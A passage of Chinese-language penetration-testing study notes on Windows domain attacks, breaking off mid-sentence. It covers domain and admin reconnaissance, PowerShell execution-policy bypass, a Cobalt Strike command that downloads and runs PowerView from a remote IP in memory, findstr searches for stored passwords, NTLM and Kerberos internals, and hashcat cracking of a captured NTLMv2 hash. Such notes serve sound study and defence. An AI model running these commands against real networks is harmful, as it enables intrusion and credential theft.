hack\\administrator</p>\n</blockquote>\n<p>如果当前内网中存在域，那么本地普通用户只能查询本机相关信息，不能查询域内信息.</p>\n<p>而本地管理员用户和域内用户可以查询域内信息.</p>\n<p>本地管理员 Admmistrator 权限可以直接提升为 Ntauthority 或 System 权限，因此，在域中，除普通用户外，所有的机器都有 — 个机器用户（用户名是机器名加上 &quot;$&quot;）。在本质上，<strong> 机器的 system 用户对应的就是域里面的机器用户</strong></p>\n<h4 id=\"判断域方法\"><a class=\"markdownIt-Anchor\" href=\"#判断域方法\">#</a> 判断域方法</h4>\n<p>1.ipconfig /all</p>\n<blockquote>\n<p>主 dns 后缀</p>\n<p>通过 nslookup 查询该后缀，可以得到域控</p>\n</blockquote>\n<p>2.systeminfo</p>\n<blockquote>\n<p>域:hack.com</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> config workstation</p>\n<blockquote>\n<p>工作站域 DNS 名称</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> time /domain</p>\n<blockquote>\n<p>1,2 都代表存在域</p>\n</blockquote>\n<p>1. 存在域，但当前用户不是域用户</p>\n<p>​\t系统错误 5，本地 administrator 是此效果，但提权后，变为第二种现象</p>\n<p>2. 存在域，并且当前用户是域用户</p>\n<p>​\thack.com 当前时间</p>\n<p>3. 当前网络环境为工作组，不存在域</p>\n<p>​\t找不到域控</p>\n<p>降权 - system 变为 administrator 去执行一些命令，计划任务，net localgroup</p>\n<p>提权 - administrator 变为 system 变为域用户</p>\n<p>添加本地管理员的方法：在本地加，在域里面的 domain admins 组加</p>\n<h4 id=\"查询域\"><a class=\"markdownIt-Anchor\" href=\"#查询域\">#</a> 查询域</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net view /domain:xxx     //域内计算机</span><br><span class=\"line\">net group /domain   //查询用户列表</span><br><span class=\"line\">net group &quot;domain admins&quot;/domain   //查询用户列表</span><br><span class=\"line\">nltest /domain_trusts  //获取域信任信息，为后续跨域 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"找域控\"><a class=\"markdownIt-Anchor\" href=\"#找域控\">#</a> 找域控</h3>\n<p>1.nltest /DCLIST:hack</p>\n<blockquote>\n<p>在使用 ping 或者 nslookup 解析域控的 IP</p>\n</blockquote>\n<p>2. 查看域控主域名</p>\n<blockquote>\n<p><code>nslookup ‐type=SRV _ldap._tcp</code></p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzMubmV0\">3.net</span> time /domain</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzQubmV0\">4.net</span> group “Domain Controllers” /domain</p>\n<h3 id=\"获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#获取用户信息\">#</a> 获取用户信息</h3>\n<p>1. 查询域内用户</p>\n<p>net user /domain</p>\n<p>2. 获取域内用户详细信息</p>\n<p><code>wmic</code></p>\n<blockquote>\n<p>wmic /?</p>\n<p>wmic user account get all</p>\n<p>wmic useraccount get name</p>\n<blockquote>\n<p>C:\\Users\\18310&gt;wmic useraccount get name<br>\nName<br>\n18310<br>\nAdministrator<br>\nDefaultAccount<br>\nGuest<br>\nhahaha<br>\nmysql<br>\nVUSR_LAPTOP-8A2UNITB<br>\nWDAGUtilityAccount<br>\nwww</p>\n</blockquote>\n<p>wmic useraccount get domain,name</p>\n</blockquote>\n<p>2. 查看存在用户</p>\n<blockquote>\n<p>dsquery</p>\n<p>dsquery user</p>\n<p>dsquery computer</p>\n</blockquote>\n<p>3. 查域管</p>\n<blockquote>\n<p>net group “domain admins” /domain</p>\n<p>net group “Enterprise Admins” /domain</p>\n</blockquote>\n<h3 id=\"定位域管\"><a class=\"markdownIt-Anchor\" href=\"#定位域管\">#</a> 定位域管</h3>\n<p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员权限，也就是说，当目机被添加到城中。成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中，因此域管理员组的成员都可以访问本地计算机，且具备安全控制权限判断域内机器有谁登陆过，或者谁正在登陆，为后续获取 hash 或明文密码，横向传递做铺垫</p>\n<p>1. 通过 psloggedon.exe</p>\n<blockquote>\n<p>PsLoggedon.exe ahzngsan   // 用户登录过那些机器</p>\n<p>PsLoggedon.exe \\\\PC-2003   // 机器被哪些用户登陆过</p>\n</blockquote>\n<p>2.PVEDFindADUser.exe 工具</p>\n<p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要具有.NETFramework 2.0，并且需要具有管理员权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‐h：显示帮助信息</span><br><span class=\"line\">‐current[&quot;username&quot;]：如果仅指定‐current参数，将获取目标计算机上当前登录的所有用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示该用户登录的计算机</span><br><span class=\"line\">‐last[&quot;username&quot;]：如果仅指定‐last参数，将获取目标计算机上最后一个登录用户。如果指定了用户名</span><br><span class=\"line\">（Domain\\Username），则显示此用户上次登录的计算机。根据网络的安全策略，可能会隐藏最后一个登录用户的用户</span><br><span class=\"line\">名，此时使用该工具可能无法得到用户名</span><br><span class=\"line\">‐noping：阻止该工具在获取用户登陆信息之前对目标执行ping命令</span><br><span class=\"line\">‐target：可选参数，用于指定要查询的主机。如果未指定该参数，将查询域中的所有主机。如果指定了此参数，主机名</span><br><span class=\"line\">列表由逗号分隔</span><br><span class=\"line\">直接运行&quot;pvefindaduser.exe ‐current&quot;，即可显示域中所有计算机上当前登录的用户</span><br></pre></td></tr></table></figure>\n<p>3.netview.exe</p>\n<p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登陆会话，利 NetShareEnum 找寻共享，利用 NetWkstaUserEnum 枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe 的绝大部分功能不需要管理员权限就可以使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用语法：</span><br><span class=\"line\">netview.exe &lt;参数&gt;</span><br><span class=\"line\">‐h：显示帮助菜单。</span><br><span class=\"line\">‐f filename.txt：指定从中提取主机列表的文件。</span><br><span class=\"line\">‐e filename.txt：指定要排除的主机名文件。</span><br><span class=\"line\">‐o filename.txt：将所有输出重定向到文件。</span><br><span class=\"line\">‐d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。</span><br><span class=\"line\">‐g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</span><br><span class=\"line\">‐c：检查对已找到共享的访问权限。</span><br></pre></td></tr></table></figure>\n<p>4.NSE</p>\n<p>如果存在域账户或者本地账户就可以使用 Nmap 的 smb-enum-sessions.nes 引擎获取远程机器的登录会话（不需要管理员权限）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">smb‐enum‐domain：对域控制器进行信息收集，可以获取主机的信息、用户、可使用密码策略的用户等</span><br><span class=\"line\">smb‐enum‐users：在进行域渗透测试时，如果获得了域内某台主机的权限，无法获取更多的域用户信息，就可以借助这</span><br><span class=\"line\">个脚本对域控制器进行扫描</span><br><span class=\"line\">smb‐enum‐shares：遍历远程主机的共享目录</span><br><span class=\"line\">smb‐enum‐processes：对主机的系统进行遍历。通过这些信息，可以知道目标主机上正在运行哪些软件。</span><br><span class=\"line\">smb‐enum‐sessions：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class=\"line\">smb‐os‐discovery：收集目标主机的操作系统、计算机名、域名域林名称、NetBIOS机器名、NetBIOS域名，工作组、</span><br></pre></td></tr></table></figure>\n<p>5.powerview</p>\n<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">powershell.exe ‐exec bypass ‐command &quot;&amp; &#123; import‐module .\\PowerView.ps1;Invoke‐UserHunter&#125;“</span><br></pre></td></tr></table></figure>\n<h3 id=\"powershell\"><a class=\"markdownIt-Anchor\" href=\"#powershell\">#</a> powershell</h3>\n<p>Powershell 一般初始化情况下都会禁止脚本执行。脚本能否执行取决于 Powershell 的执行策略</p>\n<p>Get-ExecutionPolicy 查看权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-ExecutionPolicy </span><br><span class=\"line\">Unrestricted:权限最高，可以不受限制执行任何脚本。</span><br><span class=\"line\">Default:为Powershell默认的策略：Restricted，不允许任何脚本执行。</span><br><span class=\"line\">AllSigned：所有脚本都必须经过签名才能在运行。</span><br><span class=\"line\">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名</span><br></pre></td></tr></table></figure>\n<p><strong>PowerSploit</strong></p>\n<p>PowerSploit 是 GitHub 上面的一个安全项目，上面有很多 powershell 攻击脚本，它们主要被用来渗</p>\n<p>透中的信息侦察、权限提升、权限维持。</p>\n<p>Powershell 的优点:</p>\n<p>1. 代码运行在内存中可以不去接触磁盘</p>\n<p>2. 从另一个系统中下载代码并执行</p>\n<p>3. 很多安全产品并不能监测到 powershell 的活动</p>\n<p>4.cmd.exe 通常被阻止运行，但是 powershell 不会</p>\n<p>执行方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell.exe -exec bypass -command &quot;&amp; &#123; import-module C:\\Users\\Administrator\\Desktop\\PowerView.ps1;Get-NetUser&#125;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">python -m http.server 8080</span><br><span class=\"line\">shell powershell -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://118.178.134.226:8080/PowerView.ps1&#x27;);import-module .\\PowerView.ps1;Get-NetShare</span><br><span class=\"line\"></span><br><span class=\"line\">beacon&gt; powershell-import //导入各种powershell脚本</span><br><span class=\"line\">beacon&gt;powershell posershell脚本名 //执行脚本</span><br><span class=\"line\">beacon&gt; powershell Check-VM //执行命令</span><br></pre></td></tr></table></figure>\n<p><strong>Nishang</strong></p>\n<p>Nishang 是一款针对 PowerShell 的渗透工具。</p>\n<p>查看模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shell powershell Import-Module .\\nishang\\nishang.psm1;Get-Command -Module nishang</span><br></pre></td></tr></table></figure>\n<p>远程执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">powershell-import nishang\\nishang.psm1</span><br><span class=\"line\">powershell 命令</span><br></pre></td></tr></table></figure>\n<h3 id=\"定位敏感信息\"><a class=\"markdownIt-Anchor\" href=\"#定位敏感信息\">#</a> 定位敏感信息</h3>\n<p>内网的核心敏感数据，不仅包括数据库、电子邮件，还包括个人数据及组织的业务数据、技术数据等。</p>\n<p>资料、数据、文件的定位流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">定位内部人事组织结构</span><br><span class=\"line\"></span><br><span class=\"line\">在内部人事组织结构中寻找需要监视的人员</span><br><span class=\"line\"></span><br><span class=\"line\">定位相关人员的机器</span><br><span class=\"line\"></span><br><span class=\"line\">视相关人员存放文档的位置</span><br><span class=\"line\"></span><br><span class=\"line\">列出存放文档的服务器的目录</span><br></pre></td></tr></table></figure>\n<p>重点核心业务机器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">高级管理人员 系统管理人员 财务/人事/业务人员的个人计算机</span><br><span class=\"line\">产品管理系统服务器</span><br><span class=\"line\">办公系统服务器</span><br><span class=\"line\">财务应用系统服务器</span><br><span class=\"line\">核心产品源码服务器（SVN/GIT服务器）</span><br><span class=\"line\">数据库服务器</span><br><span class=\"line\">文件服务器，</span><br><span class=\"line\">共享服务器</span><br><span class=\"line\">电子邮件服务器</span><br><span class=\"line\">网站监控系统服务器</span><br><span class=\"line\">信息安全监控服务器</span><br><span class=\"line\">生产工厂服务器</span><br></pre></td></tr></table></figure>\n<p>敏感信息和敏感文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">站点源码备份文件，</span><br><span class=\"line\">数据库备份文件等等</span><br><span class=\"line\">游览器保存的密码和游览器的cookie</span><br><span class=\"line\">其他用户会话，</span><br><span class=\"line\">3389和ipc$连接记录，</span><br><span class=\"line\">回收站中的信息等等</span><br><span class=\"line\">Windows的无线密码</span><br><span class=\"line\">网络内部的各种账号密码，</span><br><span class=\"line\">包含电子邮箱，V**，FTP等等</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.指定目录下搜集各类敏感文件</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.txt&quot;</span><br><span class=\"line\">dir /a /s /b C:\\&quot;*.xlsx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.md&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.sql&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.pdf&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.docx&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*.doc&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*conf*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*bak*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pwd*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*pass*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*login*&quot;</span><br><span class=\"line\">dir /a /s /b d:\\&quot;*user*&quot;</span><br><span class=\"line\">2.指定目录下的文件中搜集各种账号密码</span><br><span class=\"line\">findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class=\"line\">findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br></pre></td></tr></table></figure>\n<h2 id=\"windows-认证密码抓取\"><a class=\"markdownIt-Anchor\" href=\"#windows-认证密码抓取\">#</a> windows 认证密码抓取</h2>\n<p>windows 认证</p>\n<p>本地</p>\n<p>网络</p>\n<p>kerberos</p>\n<h3 id=\"本地认证-ntlm和lm\"><a class=\"markdownIt-Anchor\" href=\"#本地认证-ntlm和lm\">#</a> 本地认证 - NTLM 和 LM</h3>\n<p>Windows 的登陆密码是储存在系统本地的 SAM 文件中的，在登陆 Windows 的时候，系统会将用户输入的密码与 SAM 文件中的密码进行对比，如果相同，则认证成功</p>\n<p>SAM 文件是位于 % SystemRoot%\\system32\\config\\ 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表着你可以随意去查看系统密码。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160013739.png\" alt=\"image-20221203160013739\"></p>\n<p>Windows 本地认证流程如下：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203160134713.png\" alt=\"image-20221203160134713\"></p>\n<p>首先，用户注销、重启、锁屏后，操作系统会让 winlogon.exe 显示登陆界面，也就是输入框界面，接收用户的输入信息后，将密码交给 lsass 进程，这个过程中会存一份明文密码，将明文密码加密成 NTLM Hash，对 SAM 数据库进行比较认证</p>\n<p>Windows Logon Process（即 winlogon.exe）：是 Windows NT 用户登陆程序，用于管理用户登陆和退出</p>\n<p>LSASS：用于微软 Windows 系统的安全机制，它用于本地安全和登陆策略</p>\n<p>本地认证中用来处理用户输入密码的进程即 lsass.exe, 密码会在这个进程中明文保存，供该进程将密码计算成 NTLMHash 与 sam 进行比对，我们使用 mimikatz 来获取的明文密码，便是在这个进程中读取到的</p>\n<p>Windows 操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在 ntds.dit 中，加密后为散列值。 Windows 操作系统中的密码一般由两部分组成，一部分为 LM Hash, 另一部分为 NTLMHash。在 Windows 操作系统中，Hash 的结构通常如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username:RID:LM‐HASH:NT‐HASH</span><br></pre></td></tr></table></figure>\n<p>LM Hash 的全名为 &quot;LAN Manager Hash&quot;, 是微软为了提高 Windows 操作系统的安全性而采 用的散列加密算法，其本质是 DES 加密。尽管 LM Hash 较容易被破解，但为了保证系统的兼容性，Windows 只是将 LM Hash 禁用了 (从 Windows vista 和 Windows Server2008 版本开始，Windows 操作系统默认禁用 LM Hash)。</p>\n<p>LM Hash 明文密码被限定在 14 位以内，也就是说，如果要停止使用 LM Hash, 将用 户的密码设置为 14 位以上即可。如果 LM Hash 被禁用了，攻击者通过工具抓取的 LM Hash 通常 为 “ad3b435b51404eead3b435b51404ee”(表示 LM Hash 为空值或被禁用) NTLM Hash 是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于 MD4 加密算法进行加密的。个人版从 Windows vista 以后，服务器版从 Windows Server 2003 以后，Windows 操作系统的认证方式均为 NTLM Hash 为了解决 LM 加密和身份验证方案中固有的安全弱点，Microsoft 于 1993 年在 Windows NT 3.1 中引入了 NTLM 协议。</p>\n<h3 id=\"windows网络认证\"><a class=\"markdownIt-Anchor\" href=\"#windows网络认证\">#</a> Windows 网络认证</h3>\n<p>在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的，只能是点对点进行信息的传输。举个例子就是，主机 A 想要访问主机 B 上的资源，就要向主机 B 发送一个存在于主机 B 上的一个账户，主机 B 接收以后会在本地进行验证，如果验证成功，才会允许主机 A 进行相应的访问</p>\n<p>NTLM 协议是一种基于 挑战（Chalenge）/ 响应（Response） 认证机制，仅支持 Windows 的网络认证协议。</p>\n<p>它主要分为协商、质询和验证三个步骤：</p>\n<blockquote>\n<p>协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。</p>\n<p>质询，这一步便是 Chalenge/Response 认证机制的关键之处，下面会介绍这里的步骤。</p>\n<p>验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源</p>\n</blockquote>\n<p>认证流程<br>\n 1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个 16 位的随机字符，即 Chalenge，然后用查询到的这个 user 的 NTLM hash 对 Chalenge 进行加密，生成 Chalenge1，将 Chalenge1 存储在本地，并将 Chalenge 传给 client。</p>\n<p>认证失败</p>\n<p>1、首先，client 会向 server 发送一个 username，这个 username 是存在于 server 上的一个用户</p>\n<p>2、当 server 接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败</p>\n<p>3、当 client 接收到 Chalenge 时，将发送的 username 所对应的 NTLM hash 对 Chalenge 进行加密即 Response，并 Response 发送给 server。</p>\n<p>4、server 在收到 Response 后，将其与 Chalenge1 进行比较，如果相同，则验证成功</p>\n<p>NTLM v1 的 Challenge 有 8 位，NTLM v1 的主要加密算法是 DES</p>\n<p>NTLM v2 的 Challenge 为 16 位；NTLM v2 的主要加密算法是 HMAC‐MD5。</p>\n<p><code>net use \\\\192.168.41.130 /u:kkk Admin@123</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205140859339.png\" alt=\"image-20221205140859339\"></p>\n<p>NTLMv2 格式如下：</p>\n<p>username::domain:challenge:HMAC‐MD5:blob</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：对应数据包中 user name</span><br><span class=\"line\">domain:对应数据包中的 Domain name</span><br><span class=\"line\">HMAC‐MD5：对应数据包中的NTProofStr</span><br><span class=\"line\">blob：数据库包中rsponse去掉HMAC‐MD5的值</span><br></pre></td></tr></table></figure>\n<p>使用 hashcat 破解密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat ‐m 5600kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d801060004000200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340031002e003100330030000000000000000000 1.txt ‐‐force</span><br></pre></td></tr></table></figure>\n<p>抓取 NTLMV2：Inveigh-master</p>\n<h3 id=\"kerberos认证\"><a class=\"markdownIt-Anchor\" href=\"#kerberos认证\">#</a> Kerberos 认证</h3>\n<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的</p>\n<p>kerberos 协议中也存在三个角色，分别是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">客户端（client）：发送请求的一方</span><br><span class=\"line\">服务端（Server）：接收请求的一方</span><br><span class=\"line\">密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：</span><br><span class=\"line\">AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</span><br><span class=\"line\">TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据（Ticket）</span><br></pre></td></tr></table></figure>\n<p>所以整个 kerberos 认证流程可以简化描述如下： 客户端在访问每个想要访问的网络服务时，他需要携带一个专门用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供服务。所以整个认证流程可简化为两大步：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；</span><br><span class=\"line\">2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205143756973.png\" alt=\"image-20221205143756973\"></p>\n<p>所以 kerberos 通信可以分为 3 步，我们逐步详解</p>\n<p><strong>通信第一步客户端和 AS 进行通信</strong></p>\n<p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到 KDC 获得服务授予票据（Ticket）。由于客户端是第一次访问 KDC，此时 KDC 也不确定该客户端的身份，所以第一次通信的目的为 KDC 认证客户端身份，确认客户端是一个可靠且拥有访问 KDC 权限的客户端，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221205144558462.png\" alt=\"image-20221205144558462\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；</span><br><span class=\"line\">2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</span><br><span class=\"line\">3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</span><br><span class=\"line\">3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</span><br><span class=\"line\">3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。至此，第一次通信完成。</span><br></pre></td></tr></table></figure>\n<p><strong>通信第二步客户端和 TGS 进行通信</strong></p>\n<p>此时的客户端收到了来自 KDC（其实是 AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的 TGS 的信息，和用于与 TGS 通信时的密钥 CT_SK。首先他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于 5 分钟，如果大于五分钟则认为该 AS 是伪造的，认证至此失败。如果时间戳合理，客户端便准备向 TGS 